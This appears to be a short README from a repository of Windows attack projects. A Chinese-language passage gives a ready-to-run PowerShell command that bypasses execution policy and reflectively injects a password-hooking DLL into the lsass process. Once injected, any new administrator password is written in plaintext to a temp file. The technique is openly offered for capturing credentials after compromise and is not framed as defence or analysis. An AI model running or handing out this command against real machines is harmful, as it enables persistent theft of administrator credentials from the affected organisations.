Misc-Windows-Hacking
====================

Miscellaneous projects related to attacking Windows.


都已经拿到管理员密码了，你还想怎样？没错，我不仅要拿你的密码，就算你修改新的密码，我也要知道！
准备HookPasswordChange.dll和Invoke-ReflectivePEInjection.ps1文件，然后运行该powershell脚本将dll注入到lsass进程中。执行命令：
powershell –exec bypass –Command "& {Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass}" 

成功安装，当管理员修改密码的时候会记录下新的密码，且以文本的形式保存在c:\windows\temp\passwords.txt
